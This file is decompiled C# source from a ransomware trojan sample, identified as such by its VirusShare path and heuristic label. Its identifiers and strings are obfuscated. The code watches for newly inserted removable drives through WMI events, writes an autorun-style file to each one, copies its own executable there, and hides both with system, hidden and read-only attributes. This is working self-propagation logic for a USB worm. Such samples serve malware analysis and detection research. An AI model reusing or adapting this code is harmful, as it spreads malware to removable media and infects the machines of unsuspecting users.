// Decompiled with JetBrains decompiler
// Type: 
// Assembly: svchost, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 422D1FBC-502B-4DB7-AC18-B994031CE62D
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\HEUR-Trojan-Ransom.Win32.Generic-7709a3ed96ddad83c1364a32bd84290b3d00212a09fc6619f0588d3725c06799.exe

using System;
using System.IO;
using System.Management;
using System.Threading;
using System.Windows.Forms;

internal sealed class \u000E
{
  private static ManagementEventWatcher \u0002;

  public static void \u0002()
  {
    ManagementScope scope = new ManagementScope(\u0008\u2003.\u0002(415306219));
    scope.Options.EnablePrivileges = true;
    try
    {
      \u000E.\u0002 = new ManagementEventWatcher(scope, (EventQuery) new WqlEventQuery()
      {
        EventClassName = \u0008\u2003.\u0002(415306236),
        WithinInterval = new TimeSpan(0, 0, 3),
        Condition = \u0008\u2003.\u0002(415306202)
      });
      \u000E.\u0002.EventArrived += new EventArrivedEventHandler(\u000E.\u0002);
      \u000E.\u0002.Start();
    }
    catch
    {
      if (\u000E.\u0002 == null)
        return;
      \u000E.\u0002.Stop();
    }
  }

  public static void \u0002(object _param0, EventArgs _param1)
  {
    foreach (DriveInfo drive in DriveInfo.GetDrives())
    {
      if (drive.DriveType == DriveType.Removable && drive.IsReady)
      {
        int num1 = 0;
        try
        {
          if (File.Exists(drive.Name + \u0008\u2003.\u0002(415306127)))
            File.Delete(drive.Name + \u0008\u2003.\u0002(415306127));
          if (File.Exists(drive.Name + \u0008\u2003.\u0002(415306129)))
            File.Delete(drive.Name + \u0008\u2003.\u0002(415306129));
        }
        catch
        {
        }
        string str = Path.Combine(Environment.CurrentDirectory, \u0008\u2003.\u0002(415306127));
        StreamWriter streamWriter = new StreamWriter(str);
        streamWriter.WriteLine(\u0008\u2003.\u0002(415306081));
        streamWriter.WriteLine(\u0008\u2003.\u0002(415306097));
        streamWriter.WriteLine(\u0008\u2003.\u0002(415306055));
        streamWriter.WriteLine(\u0008\u2003.\u0002(415306038));
        streamWriter.WriteLine(\u0008\u2003.\u0002(415306013));
        streamWriter.WriteLine(\u0008\u2003.\u0002(415306492));
        streamWriter.Close();
        File.Copy(str, drive.Name + \u0008\u2003.\u0002(415306127));
        int num2 = num1 + 1;
        File.SetAttributes(drive.Name + \u0008\u2003.\u0002(415306127), File.GetAttributes(drive.Name + \u0008\u2003.\u0002(415306127)) | FileAttributes.System | FileAttributes.Hidden | FileAttributes.NotContentIndexed | FileAttributes.ReadOnly);
        try
        {
          File.Copy(Application.ExecutablePath, drive.Name + \u0008\u2003.\u0002(415306460));
          ++num2;
          File.SetAttributes(drive.Name + \u0008\u2003.\u0002(415306460), File.GetAttributes(drive.Name + \u0008\u2003.\u0002(415306460)) | FileAttributes.System | FileAttributes.Hidden | FileAttributes.NotContentIndexed | FileAttributes.ReadOnly);
          \u000F\u2001.\u0002.\u0002(\u0008\u2003.\u0002(415306414) + drive.Name + \u0008\u2003.\u0002(415306423) + num2.ToString() + \u0008\u2003.\u0002(415306395), \u0002\u2002.\u0005, \u0008\u2003.\u0002(415306336));
        }
        finally
        {
          \u000F\u2001.\u0002.\u0002(\u0008\u2003.\u0002(415306414) + drive.Name + \u0008\u2003.\u0002(415306423) + num2.ToString() + \u0008\u2003.\u0002(415306395), \u0002\u2002.\u0005, \u0008\u2003.\u0002(415306336));
          Thread.Sleep(2000);
        }
      }
      if (\u000E.\u0002 != null)
        \u000E.\u0002.Stop();
      \u000E.\u0002.Start();
    }
  }
}
